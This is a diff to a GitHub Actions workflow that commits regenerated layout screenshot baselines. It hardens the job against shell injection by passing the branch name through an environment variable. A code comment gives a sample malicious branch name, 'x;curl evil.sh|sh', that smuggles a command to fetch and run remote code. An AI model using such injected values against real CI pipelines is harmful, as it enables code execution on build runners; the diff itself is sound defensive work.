@@ -105,9 +105,16 @@ jobs:
           npx playwright install --with-deps chromium
           npm run test:layout:update
 
+      # Every `${{ }}` value this script needs is bound to an env var here and
+      # read as "$VAR" below. Nothing from the `github` context is interpolated
+      # into the shell text itself: a branch name is attacker-influencable, so
+      # `git push origin HEAD:${{ github.ref_name }}` would let a branch called
+      # `x;curl evil.sh|sh` run as the workflow. (semgrep
+      # yaml.github-actions.security.run-shell-injection.run-shell-injection)
       - name: Commit the regenerated baselines
         env:
           REASON: ${{ inputs.reason || format('push to tests/layout/BASELINES.request ({0})', github.sha) }}
+          REF_NAME: ${{ github.ref_name }}
         run: |
           set -e
           git config user.name "github-actions[bot]"
@@ -118,8 +125,8 @@ jobs:
             exit 0
           fi
           git commit -m "test(layout): regenerate CI screenshot baselines" -m "Reason: ${REASON}" -m "Generated on the CI runner by .github/workflows/layout-baselines.yml, which is the only environment these may be generated in — see docs/layout-guardrail.md."
-          git push origin HEAD:${{ github.ref_name }}
-          echo "Baselines committed to ${{ github.ref_name }}."
+          git push origin "HEAD:${REF_NAME}"
+          echo "Baselines committed to ${REF_NAME}."
 
       # The report carries the actual/expected/diff images, which is what makes
       # a regeneration reviewable when the change is not obvious from the PNGs.
